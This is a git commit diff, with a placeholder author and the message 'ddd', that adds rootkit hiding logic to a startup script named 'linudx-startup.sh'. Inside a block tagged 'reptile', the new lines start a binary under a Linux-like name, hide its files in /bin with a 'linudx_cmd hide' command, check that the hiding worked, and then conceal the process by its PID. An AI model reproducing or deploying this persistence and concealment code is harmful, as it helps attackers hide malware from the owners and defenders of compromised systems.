afa8df8aac1d8f0ed8de6034411198b1d3dda6ec
test <test@testqq.com>
2019-03-10 19:59:37 +0800

    ddd

--- linudx-startup.sh
+++ linudx-startup.sh
@@ -2,5 +2,22 @@
 
 #<reptile> 
 /bin/linudx-home
-echo `pidof linudx-home`>/bin/linudx-home-pid
+p1=`pidof linudx-home`
+
+#hide###########################
+/linudx/linudx_cmd hide
+if [ "`ls /bin | grep linudx`" ];then
+  /linudx/linudx_cmd hide 
+else
+  echo "hide success check1"
+fi
+
+if [ "`ls /bin | grep linudx`" ];then
+  echo "hide failed" 
+else
+  echo "hide success check2"
+fi
+#hide end########################
+
+/linudx/linudx_cmd hide $p1
 #</reptile>
